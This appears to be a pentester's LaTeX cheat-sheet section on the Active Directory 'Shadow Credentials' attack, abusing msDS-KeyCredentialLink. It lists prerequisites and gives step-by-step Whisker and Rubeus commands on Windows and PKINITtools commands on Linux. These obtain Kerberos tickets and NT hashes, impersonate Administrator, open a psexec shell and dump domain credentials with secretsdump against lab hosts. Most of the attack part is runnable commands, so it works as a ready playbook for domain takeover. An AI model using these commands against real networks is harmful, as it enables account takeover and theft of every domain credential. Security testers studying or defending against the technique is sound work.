\section{Key credential abuse (Shadow Credential)}

more info in \href{https://pentestlab.blog/2022/02/07/shadow-credentials/}{Shadow Credentials}

pre-requisits:
\begin{itemize}
    \item GenericAll
    \item GenericWrite
    \item WriteProperty over \verb+msDS-KeyCredentialLink+
    \item The Domain Functional Level should be Windows Server 2016 or above
    \item The Domain Controller to be used during the attack must have its certificate and keys. This means the organization must have AD CS, PKI, CA, or something similar.
\end{itemize}

 If Pre-req 3 is not met, a \verb+KRB-ERROR (16): KDC_ERR_PADATA_TYPE_NOSUPP+ will be raised. See \href{https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html}{Authenticating with certificates when PKINIT is not supported}

This attack is described in
\href{https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab}{Shadow
Credentials: Abusing Key Trust Account Mapping for Account Takeover}.

Using the permission \verb+AddKeyCredentialLink+, it is possible to add “Key
Credentials” to the attribute \verb+msDS-KeyCredentialLink+ 
of the target user/computer object and then perform Kerberos authentication as
that account using \verb+PKINIT+. 

\subsection{From Windows}

then executing the command line provided for \verb+Rubeus+ we obtein the NTLM
\begin{verbatim}
C:\Users\btables\Desktop>.\whisker add /target:SFLOWERS /dc:10.10.11.175
\end{verbatim}

\begin{verbatim}
...SNIP...
Rubeus.exe asktgt /user:SFLOWERS 
    /certificate:MIIJsAIBAzCCCWwGCSqGSIb3DQEHAaSqGS
    /password:"<certif-password" /domain:lab.local /dc:LAB-DC.lab.local /getcredentials /show
\end{verbatim}

\verb+/getcredentials+ will provide hash NTLM

One of the different methods we can use is to create a sacrificial logon session
\begin{verbatim}
.\Rubeus.exe createnetonly /program:powershell.exe /show
.\Rubeus.exe ptt /ticket:doIGJjCCBiKgAwIBBaEDAgEWooIFRTCCBUFhggU9MIIFOaADA...SNIP...
\end{verbatim}

other actions:
\begin{itemize}
    \item list \verb+.\Whisker.exe list /target:gabriel+
    \item clear \verb+.\Whisker.exe remove /target:gabriel /deviceid:...+
\end{itemize}

\subsection{From Linux}
\begin{itemize}
    \item 
        \href{https://github.com/ShutdownRepo/pywhisker}{pyWhisker}
    \item
        \href{https://github.com/p0dalirius/pydsinternals}{PyDSInternals}
    \item
        \href{https://github.com/dirkjanm/PKINITtools}{Dirk-jan's PKINITtools}
\end{itemize}


\verb+gettgtpkinit.py+ is one of the tools available in \verb+PKINITtools+ to get a TGT from a pfx. The output of \verb+gettgtpkinit.py+ also has the AS-REP encryption key we can use to decrypt the ticket and extract Gabriel's NT Hash. We need to use the tool getnthash.py available in \verb+PKINITtools+ and add the option \verb+-key <key>+, and we also need to use the TGT.

\begin{verbatim}
proxychains gettgtpkinit \
    -cert-pfx $(pwd)/xeyXoXhM.pfx \ 
    -pfx-pass CR8NF2IRE6pIR4y8xq9N \ 
    -dc-ip 172.16.114.20  \
    fabricorp.ad/'dc05$' \ 
    /tmp/dc05.ccache

# Note the AS_REP_encryption_key returned

KRB5CCNAME=/tmp/dc05.ccache proxychains getnthash \ 
    -key <AS_REP_encryption_key>> \
    fabricorp.ad/'dc05$' -dc-ip 172.16.114.20 

KRB5CCNAME=/tmp/dc05.ccache proxychains getST.py \
    -self -impersonate "Administrator" \ 
    -altservice "HOST/DC05.fabricorp.ad" \ 
    -k -no-pass \ 
    -dc-ip 172.16.114.20 \ 
    fabricorp.ad/'dc05$' 

KRB5CCNAME=$(pwd)/Administrator.ccache proxychains psexec.py \ 
    -debug -k -no-pass dc05.fabricorp.ad

KRB5CCNAME=$(pwd)/Administrator.ccache proxychains secretsdump.py \ 
    -debug -just-dc -user-status -no-pass -k dc05.fabricorp.ad
\end{verbatim}


